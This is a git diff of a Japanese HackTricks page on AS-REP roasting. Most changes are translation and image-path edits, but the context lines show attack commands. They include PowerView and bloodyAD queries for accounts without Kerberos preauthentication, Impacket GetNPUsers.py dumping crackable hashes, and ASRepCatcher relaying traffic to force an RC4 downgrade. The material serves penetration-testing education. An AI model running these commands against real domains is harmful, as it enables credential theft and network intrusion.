@@ -15,7 +15,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
 
@@ -52,9 +52,9 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
-#### AS\_REPメッセージのリクエスト
+#### AS_REPメッセージのリクエスト
 
-{% code title="Linuxを使用して" %}
+{% code title="Using Linux" %}
 ```bash
 #Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
@@ -95,10 +95,10 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 ```
 {% endcode %}
 
-## ASREProast 認証情報なし
+## ASREProast 認証なし
 
-攻撃者は、ネットワークを横断する AS-REP パケットをキャプチャするために中間者の位置を利用でき、Kerberos プレ認証が無効になっていることに依存しません。したがって、VLAN 上のすべてのユーザーに対して機能します。\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) を使用することでこれを実現できます。さらに、このツールは Kerberos 交渉を変更することにより、クライアントワークステーションに RC4 を使用させることを強制します。
+攻撃者は、ネットワークを横断する AS-REP パケットをキャプチャするために中間者の位置を利用でき、Kerberos の事前認証が無効になっていることに依存しません。したがって、VLAN 上のすべてのユーザーに対して機能します。\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) を使用することでこれを実現できます。さらに、このツールは Kerberos 交渉を変更することでクライアントワークステーションに RC4 を使用させることを強制します。
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -115,7 +115,7 @@ ASRepCatcher listen
 
 ***
 
-<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)サーバーに参加しましょう！
 
@@ -123,7 +123,7 @@ ASRepCatcher listen
 ハッキングのスリルと課題に深く掘り下げたコンテンツに参加する
 
 **リアルタイムハックニュース**\
-リアルタイムのニュースと洞察を通じて、急速に進化するハッキングの世界を把握する
+リアルタイムのニュースと洞察を通じて、急速に進化するハッキングの世界を最新の状態に保つ
 
 **最新のお知らせ**\
 新しいバグバウンティの開始や重要なプラットフォームの更新について情報を得る
@@ -140,7 +140,7 @@ GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
 * 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してハッキングのトリックを共有してください。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングのトリックを共有してください。
 
 </details>
 {% endhint %}
